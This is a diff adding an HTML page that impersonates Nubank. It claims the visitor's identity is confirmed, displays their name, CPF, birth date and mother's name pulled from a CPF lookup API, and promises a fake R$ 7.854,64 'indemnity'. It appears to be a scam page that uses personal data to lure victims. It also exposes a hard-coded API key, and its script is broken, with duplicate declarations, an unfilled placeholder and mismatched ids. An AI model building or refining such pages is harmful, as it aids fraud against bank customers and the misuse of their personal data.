@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Confirmação de Identidade - Nubank</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #ffffff;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: auto;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 20px;
+    }
+
+    .logo {
+      margin-bottom: 10px;
+    }
+
+    .divider {
+      border-top: 3px solid #8000ff;
+      margin: 20px 0;
+    }
+
+    .info-box {
+      background: #f3f3f3;
+      padding: 15px;
+      margin-bottom: 10px;
+      border-radius: 5px;
+      text-align: left;
+    }
+
+    .info-box b {
+      display: block;
+      font-size: 0.9em;
+      color: #777;
+    }
+
+    .info-box span {
+      font-weight: bold;
+      font-size: 1.1em;
+    }
+
+    .footer {
+      font-size: 0.9em;
+      color: #666;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img class="logo" src="https://i.postimg.cc/X7JSyHqM/Captura-de-tela-2025-05-30-234638.png" alt="Nubank" width="100">
+
+    <div class="divider"></div>
+
+    <div class="info-box">
+        <center> Sua identidade foi confirmada com sucesso! <br> Confira abaixo as informações cadastradas.<br>
+    </div>
+
+    <div class="info-box">
+      <b>Nome completo</b>
+      <span id="nome">...</span>
+    </div>
+
+    <div class="info-box">
+      <b>CPF</b>
+      <span id="cpf">...</span>
+    </div>
+
+    <div class="info-box">
+      <b>Data de Nascimento</b>
+      <span id="dataNascimento">...</span>
+    </div>
+
+    <div class="info-box">
+      <b>Nome da Mãe</b>
+      <span id="mae">...</span>
+    </div>
+
+    <div class="info-box">
+      <b>Indenização a receber</b>
+      <strong> </p> R$ 7.854,64  
+   </div>
+
+    <div class="divider"></div>
+
+    <div class="footer">
+      Sistema de Verificação - Nubank<br>
+      Santa Catarina
+    </div>
+  </div>
+
+  <script>
+ function buscarDados() {
+      const cpf = document.getElementById('cpf').value.trim();
+
+      if (!cpf || cpf.length < 11) {
+        alert("Digite um CPF válido.");
+        return;
+      }
+
+    // Obter CPF da URL (https://api.mytrust.space/v1/cpf/{{cpf}})
+    const params = new URLSearchParams(window.location.search);
+    const cpf = params.get("cpf");
+
+    // Substitua pela URL da sua API
+    const urlDaAPI = `https://api.mytrust.space/v1/cpf/{{cpf}}`;
+
+    // Buscar dados e preencher
+    fetch(`https://api.mytrust.space/v1/cpf/{{cpf}}`, {
+  headers: {
+    "Authorization": "sk_01jvm86wy4yykgc5famr8wcepw01jvm86wy57enmmdvvmdpcbwfy"
+  }
+})
+
+      .then(response => response.json())
+      .then(dados => {
+        document.getElementById("nome").innerText = dados.nome;
+        document.getElementById("cpf").innerText = dados.cpf;
+        document.getElementById("datanasc").innerText = dados.dataNascimento;
+        document.getElementById("mae").innerText = dados.mae;
+      })
+      .catch(error => {
+        console.error("Erro ao buscar dados da API:", error);
+      });
+  </script>
+
+</body>
+</html>
